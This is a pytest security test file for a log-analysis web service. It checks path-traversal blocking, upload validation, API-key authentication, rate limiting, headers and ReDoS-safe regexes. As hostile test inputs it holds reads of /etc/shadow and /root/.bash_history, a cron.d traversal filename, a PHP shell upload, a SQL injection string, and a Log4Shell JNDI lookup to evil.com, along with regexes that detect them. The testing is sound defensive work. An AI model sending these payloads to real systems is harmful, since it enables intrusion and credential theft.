"""
tests/unit/test_security.py
Security hardening tests â€” path traversal, auth, ReDoS, headers.
"""

import os
import sys

_root = os.path.dirname(os.path.abspath(__file__))
for _ in range(8):
    if os.path.isfile(os.path.join(_root, 'pathconfig.py')):
        break
    _root = os.path.dirname(_root)
if _root not in sys.path:
    sys.path.insert(0, _root)
from pathconfig import ROOT, add_root
add_root()
_ROOT = ROOT

import pathlib
import types
import uuid
import pytest

from interface.web.file_upload import (
    validate_log_path, validate_upload,
    ALLOWED_BASE_DIRS, MAX_UPLOAD_BYTES,
)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# PATH TRAVERSAL â€” 10 tests
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def _workspace_test_dir(prefix: str) -> pathlib.Path:
    base = pathlib.Path(_ROOT) / "workspace" / "test-security"
    base.mkdir(parents=True, exist_ok=True)
    path = base / f"{prefix}-{uuid.uuid4().hex}"
    path.mkdir()
    return path


class TestPathTraversal:

    def test_blocks_etc_passwd(self):
        with pytest.raises(PermissionError):
            validate_log_path("/etc/passwd")

    def test_blocks_etc_shadow(self):
        with pytest.raises(PermissionError):
            validate_log_path("/etc/shadow")

    def test_blocks_proc_self_mem(self):
        with pytest.raises(PermissionError):
            validate_log_path("/proc/self/mem")

    def test_blocks_dot_dot_traversal(self):
        with pytest.raises((PermissionError, FileNotFoundError)):
            validate_log_path("/tmp/../etc/passwd")

    def test_blocks_nonexistent_file(self):
        with pytest.raises(FileNotFoundError):
            validate_log_path("/tmp/does_not_exist_nexlog_xyz.log")

    def test_allows_tmp_file(self):
        f = _workspace_test_dir("allowed-file") / "test.log"
        f.write_text("2026-01-01 GET /index.html 200")
        resolved = validate_log_path(str(f))
        assert resolved.is_file()

    def test_allows_project_root_file(self):
        f = _workspace_test_dir("project-root-file") / "access.log"
        f.write_text("127.0.0.1 - - [01/Jan/2026] GET / 200 1234")
        resolved = validate_log_path(str(f))
        assert resolved == f.resolve()

    def test_blocks_root_home(self):
        with pytest.raises(PermissionError):
            validate_log_path("/root/.bash_history")

    def test_blocks_dev_null(self):
        with pytest.raises(PermissionError):
            validate_log_path("/dev/null")

    def test_rejects_oversized_file(self, monkeypatch):
        f = _workspace_test_dir("oversized") / "huge.log"
        f.write_text("x" * 10)
        import interface.web.file_upload as fu
        monkeypatch.setattr(fu, "MAX_UPLOAD_BYTES", 5)
        with pytest.raises(ValueError, match="too large"):
            fu.validate_log_path(str(f))

    def test_blocks_prefix_sibling_of_allowed_base(self, monkeypatch):
        import interface.web.file_upload as fu
        test_dir = _workspace_test_dir("prefix-sibling")
        allowed = (test_dir / "allowed").resolve()
        allowed.mkdir()
        sibling = test_dir / "allowed_evil"
        sibling.mkdir()
        f = sibling / "access.log"
        f.write_text("127.0.0.1 GET / 200")

        monkeypatch.setattr(fu, "ALLOWED_BASE_DIRS", [allowed])
        with pytest.raises(PermissionError):
            fu.validate_log_path(str(f))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# UPLOAD VALIDATION â€” 10 tests
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class TestUploadValidation:

    def test_rejects_empty_upload(self):
        with pytest.raises(ValueError, match="Empty"):
            validate_upload(b"", "test.log")

    def test_rejects_path_traversal_in_filename(self):
        with pytest.raises(ValueError, match="traversal"):
            validate_upload(b"data", "../../../etc/cron.d/evil")

    def test_rejects_slash_in_filename(self):
        with pytest.raises(ValueError, match="traversal"):
            validate_upload(b"data", "/tmp/evil.log")

    def test_rejects_disallowed_extension(self):
        with pytest.raises(ValueError, match="Extension"):
            validate_upload(b"data", "malware.exe")

    def test_rejects_php_extension(self):
        with pytest.raises(ValueError, match="Extension"):
            validate_upload(b"<?php phpinfo(); ?>", "shell.php")

    def test_accepts_log_extension(self):
        name, fmt = validate_upload(b"127.0.0.1 GET /", "access.log")
        assert name == "access.log"

    def test_accepts_json_with_cloudtrail_magic(self):
        name, fmt = validate_upload(b'{"Records":[]}', "cloudtrail.json")
        assert name == "cloudtrail.json"
        assert fmt == "cloudtrail"

    def test_detects_gzip_magic(self):
        _, fmt = validate_upload(b"\x1f\x8b\x08" + b"\x00" * 20, "logs.gz")
        assert fmt == "gz"

    def test_detects_evtx_magic(self):
        _, fmt = validate_upload(b"MSLO" + b"\x00" * 20, "security.evtx")
        assert fmt == "evtx"

    def test_rejects_oversized_upload(self, monkeypatch):
        import interface.web.file_upload as fu
        monkeypatch.setattr(fu, "MAX_UPLOAD_BYTES", 10)
        with pytest.raises(ValueError, match="exceeds"):
            fu.validate_upload(b"x" * 11, "big.log")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# AUTH â€” 12 tests
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class TestAuth:

    def test_fails_closed_with_no_key(self, monkeypatch):
        import interface.web.auth as auth_mod
        monkeypatch.setattr(auth_mod, "_API_KEY", None)
        allowed, status, msg = auth_mod.check_auth("/api/analyse", {})
        assert not allowed
        assert status == 503
        assert "not configured" in msg

    def test_fails_closed_with_empty_key(self, monkeypatch):
        import interface.web.auth as auth_mod
        monkeypatch.setattr(auth_mod, "_API_KEY", "")
        allowed, status, msg = auth_mod.check_auth("/api/findings", {})
        assert not allowed
        assert status == 503

    def test_allows_health_without_key(self, monkeypatch):
        import interface.web.auth as auth_mod
        monkeypatch.setattr(auth_mod, "_API_KEY", None)
        allowed, status, _ = auth_mod.check_auth("/api/health", {})
        assert allowed
        assert status == 200

    def test_allows_v1_health_without_key(self, monkeypatch):
        import interface.web.auth as auth_mod
        monkeypatch.setattr(auth_mod, "_API_KEY", None)
        allowed, status, _ = auth_mod.check_auth("/api/v1/health", {})
        assert allowed

    def test_rejects_wrong_key(self, monkeypatch):
        import interface.web.auth as auth_mod
        monkeypatch.setattr(auth_mod, "_API_KEY", "correct-key-abc123")
        allowed, status, _ = auth_mod.check_auth(
            "/api/analyse", {"X-API-Key": "wrong-key"})
        assert not allowed
        assert status == 401

    def test_accepts_correct_key(self, monkeypatch):
        import interface.web.auth as auth_mod
        monkeypatch.setattr(auth_mod, "_API_KEY", "correct-key-abc123")
        allowed, status, _ = auth_mod.check_auth(
            "/api/analyse", {"X-API-Key": "correct-key-abc123"})
        assert allowed
        assert status == 200

    def test_bearer_token_header(self, monkeypatch):
        import interface.web.auth as auth_mod
        monkeypatch.setattr(auth_mod, "_API_KEY", "my-secret-token")
        allowed, _, _ = auth_mod.check_auth(
            "/api/findings", {"Authorization": "Bearer my-secret-token"})
        assert allowed

    def test_missing_header_returns_401(self, monkeypatch):
        import interface.web.auth as auth_mod
        monkeypatch.setattr(auth_mod, "_API_KEY", "some-key")
        allowed, status, _ = auth_mod.check_auth("/api/findings", {})
        assert not allowed
        assert status == 401

    def test_rate_limit_blocks_after_threshold(self, monkeypatch):
        import interface.web.auth as auth_mod
        monkeypatch.setattr(auth_mod, "_RATE_MAX_REQUESTS", 3)
        auth_mod._rate_buckets.clear()
        for _ in range(3):
            ok, _ = auth_mod.check_rate_limit("1.2.3.4")
            assert ok
        blocked, msg = auth_mod.check_rate_limit("1.2.3.4")
        assert not blocked
        assert "Rate limit" in msg

    def test_different_ips_independent_buckets(self, monkeypatch):
        import interface.web.auth as auth_mod
        monkeypatch.setattr(auth_mod, "_RATE_MAX_REQUESTS", 2)
        auth_mod._rate_buckets.clear()
        auth_mod.check_rate_limit("10.0.0.1")
        auth_mod.check_rate_limit("10.0.0.1")
        blocked, _ = auth_mod.check_rate_limit("10.0.0.1")
        assert not blocked
        # Different IP should be unaffected
        ok, _ = auth_mod.check_rate_limit("10.0.0.2")
        assert ok

    def test_security_headers_present(self):
        from interface.web.auth import SECURITY_HEADERS
        assert "X-Content-Type-Options" in SECURITY_HEADERS
        assert "X-Frame-Options" in SECURITY_HEADERS
        assert "Content-Security-Policy" in SECURITY_HEADERS
        assert SECURITY_HEADERS["X-Frame-Options"] == "DENY"
        assert SECURITY_HEADERS["X-Content-Type-Options"] == "nosniff"

    def test_get_client_ip_xff(self):
        from interface.web.auth import get_client_ip
        ip = get_client_ip({"X-Forwarded-For": "1.2.3.4, 10.0.0.1"}, "10.0.0.1")
        assert ip == "1.2.3.4"

    def test_get_client_ip_fallback(self):
        from interface.web.auth import get_client_ip
        ip = get_client_ip({}, "5.6.7.8")
        assert ip == "5.6.7.8"

    def test_direct_fastapi_app_fails_closed_without_key(self, monkeypatch):
        fastapi_testclient = pytest.importorskip("fastapi.testclient")
        import interface.web.auth as auth_mod
        from interface.web.api import create_app

        monkeypatch.setattr(auth_mod, "_API_KEY", "")
        auth_mod._rate_buckets.clear()

        client = fastapi_testclient.TestClient(
            create_app(case_db_path=":memory:")
        )
        assert client.get("/api/health").status_code == 200
        resp = client.get("/api/sessions")
        assert resp.status_code == 503
        assert "not configured" in resp.json()["error"]

    def test_direct_fastapi_app_accepts_valid_key(self, monkeypatch):
        fastapi_testclient = pytest.importorskip("fastapi.testclient")
        import interface.web.auth as auth_mod
        from interface.web.api import create_app

        monkeypatch.setattr(auth_mod, "_API_KEY", "test-key")
        auth_mod._rate_buckets.clear()

        client = fastapi_testclient.TestClient(
            create_app(case_db_path=":memory:")
        )
        resp = client.get("/api/sessions", headers={"X-API-Key": "test-key"})
        assert resp.status_code == 200

    def test_fullstack_app_fails_closed_without_key(self, monkeypatch, tmp_path):
        fastapi_testclient = pytest.importorskip("fastapi.testclient")
        import interface.web.auth as auth_mod
        from interface.web.serve import create_full_app

        monkeypatch.setattr(auth_mod, "_API_KEY", "")
        monkeypatch.delenv("NEXLOG_API_KEY", raising=False)
        auth_mod._rate_buckets.clear()

        client = fastapi_testclient.TestClient(
            create_full_app(case_db_path=str(tmp_path / "web.facase"))
        )
        assert client.get("/api/health").status_code == 200
        resp = client.get("/api/sessions")
        assert resp.status_code == 503
        assert "not configured" in resp.json()["error"]

    def test_fullstack_app_accepts_x_api_key(self, monkeypatch, tmp_path):
        fastapi_testclient = pytest.importorskip("fastapi.testclient")
        import interface.web.auth as auth_mod
        from interface.web.serve import create_full_app

        monkeypatch.setattr(auth_mod, "_API_KEY", "")
        auth_mod._rate_buckets.clear()

        client = fastapi_testclient.TestClient(
            create_full_app(case_db_path=str(tmp_path / "web.facase"), api_key="test-key")
        )
        resp = client.get("/api/sessions", headers={"X-API-Key": "test-key"})
        assert resp.status_code == 200

    def test_fullstack_app_accepts_bearer_token(self, monkeypatch, tmp_path):
        fastapi_testclient = pytest.importorskip("fastapi.testclient")
        import interface.web.auth as auth_mod
        from interface.web.serve import create_full_app

        monkeypatch.setattr(auth_mod, "_API_KEY", "")
        auth_mod._rate_buckets.clear()

        client = fastapi_testclient.TestClient(
            create_full_app(case_db_path=str(tmp_path / "web.facase"), api_key="test-key")
        )
        resp = client.get("/api/sessions", headers={"Authorization": "Bearer test-key"})
        assert resp.status_code == 200

    def test_fullstack_app_rejects_wrong_key(self, monkeypatch, tmp_path):
        fastapi_testclient = pytest.importorskip("fastapi.testclient")
        import interface.web.auth as auth_mod
        from interface.web.serve import create_full_app

        monkeypatch.setattr(auth_mod, "_API_KEY", "")
        auth_mod._rate_buckets.clear()

        client = fastapi_testclient.TestClient(
            create_full_app(case_db_path=str(tmp_path / "web.facase"), api_key="test-key")
        )
        resp = client.get("/api/sessions", headers={"X-API-Key": "wrong-key"})
        assert resp.status_code == 401

    def test_fullstack_app_v1_auth_status_alias(self, monkeypatch, tmp_path):
        fastapi_testclient = pytest.importorskip("fastapi.testclient")
        import interface.web.auth as auth_mod
        from interface.web.serve import create_full_app

        monkeypatch.setattr(auth_mod, "_API_KEY", "")
        auth_mod._rate_buckets.clear()

        client = fastapi_testclient.TestClient(
            create_full_app(case_db_path=str(tmp_path / "web.facase"), api_key="test-key")
        )
        resp = client.get("/api/v1/auth/status", headers={"X-API-Key": "test-key"})
        assert resp.status_code == 200
        assert resp.json()["auth_enabled"] is True

    def test_report_download_rejects_outside_allowed_dirs(self, monkeypatch):
        fastapi_testclient = pytest.importorskip("fastapi.testclient")
        import interface.web.auth as auth_mod
        from interface.web.api import create_app

        monkeypatch.setattr(auth_mod, "_API_KEY", "test-key")
        auth_mod._rate_buckets.clear()

        client = fastapi_testclient.TestClient(
            create_app(case_db_path=":memory:")
        )
        resp = client.get(
            "/api/report/download",
            params={"file_path": "/etc/passwd.pdf"},
            headers={"X-API-Key": "test-key"},
        )
        assert resp.status_code == 403

    def test_report_download_allows_workspace_pdf(self, monkeypatch):
        fastapi_testclient = pytest.importorskip("fastapi.testclient")
        import interface.web.auth as auth_mod
        from interface.web.api import create_app

        monkeypatch.setattr(auth_mod, "_API_KEY", "test-key")
        auth_mod._rate_buckets.clear()

        report_path = _workspace_test_dir("report-download") / "nexlog_test_report.pdf"
        report_path.write_bytes(b"%PDF-1.4\n% test\n")

        client = fastapi_testclient.TestClient(
            create_app(case_db_path=":memory:")
        )
        resp = client.get(
            "/api/report/download",
            params={"file_path": str(report_path)},
            headers={"X-API-Key": "test-key"},
        )
        assert resp.status_code == 200
        assert resp.headers["content-type"].startswith("application/pdf")


class TestSecretHandling:

    def test_abuseipdb_no_key_does_not_initialize_client(self, monkeypatch):
        from intelligence.ioc_extractor import IOC, IOCExtractor

        init_calls = []

        class FakeAbuseIPDB:
            def __init__(self, api_key):
                init_calls.append(api_key)

            def check(self, value):
                return {"abuse_confidence_score": 100}

        monkeypatch.delenv("ABUSEIPDB_API_KEY", raising=False)
        monkeypatch.setitem(
            sys.modules,
            "abuseipdb",
            types.SimpleNamespace(AbuseIPDB=FakeAbuseIPDB),
        )

        iocs = [IOC("ipv4", "8.8.8.8", 0.9, "TEST")]
        result = IOCExtractor().enrich(
            iocs,
            geoip=False,
            abuseipdb=True,
            abuseipdb_key="",
        )

        assert result is iocs
        assert init_calls == []


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ReDoS GUARD â€” placeholder until rule_engine patch is integrated
# 8 tests that test the _validate_regex_safe API
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class TestReDoSGuard:

    def _get_validator(self):
        try:
            from detection.rule_engine import _validate_regex_safe
            return _validate_regex_safe
        except ImportError:
            pytest.skip("detection.rule_engine not available in this env")

    def test_accepts_safe_regex(self):
        fn = self._get_validator()
        compiled = fn(r"GET\s+/admin", "TEST-001")
        assert compiled.search("GET /admin HTTP/1.1")

    def test_rejects_invalid_regex(self):
        fn = self._get_validator()
        with pytest.raises(ValueError, match="Invalid regex"):
            fn(r"[unclosed", "TEST-002")

    def test_accepts_sqli_pattern(self):
        fn = self._get_validator()
        pat = r"(?i)(union.*select|or.*1=1|'.*or.*'|drop.*table)"
        compiled = fn(pat, "WEB-001")
        assert compiled.search("' OR 1=1 --")

    def test_accepts_log4shell_pattern(self):
        fn = self._get_validator()
        pat = r"\$\{jndi:(ldap|rmi|dns|iiop|corba|nis|nds)://"
        compiled = fn(pat, "DISC-008")
        assert compiled.search("${jndi:ldap://evil.com/x}")

    def test_accepts_empty_pattern(self):
        fn = self._get_validator()
        compiled = fn(r"", "EMPTY-001")
        assert compiled is not None

    def test_returns_compiled_pattern(self):
        fn = self._get_validator()
        import re
        result = fn(r"failed password", "AUTH-001")
        assert hasattr(result, "search")

    def test_case_insensitive_compile(self):
        fn = self._get_validator()
        import re
        result = fn(r"FAILED", "AUTH-002")
        assert result.search("failed login")

    def test_nested_quantifier_handled(self):
        fn = self._get_validator()
        # Python re has partial ReDoS protection; just ensure it doesn't crash
        try:
            fn(r"(a+)+b", "REDOS-TEST", timeout_ms=50)
        except ValueError as e:
            assert "ReDoS" in str(e) or "Invalid" in str(e)
        # If it passes â€” Python re handled it safely, that's acceptable too


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# RUNNER
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

if __name__ == "__main__":
    result = pytest.main([__file__, "-v", "--tb=short"])
    import sys
    print("=" * 55)
    print(f"  Security tests: {'PASSED' if result == 0 else 'FAILED'}")
    print("=" * 55)
    sys.exit(result)
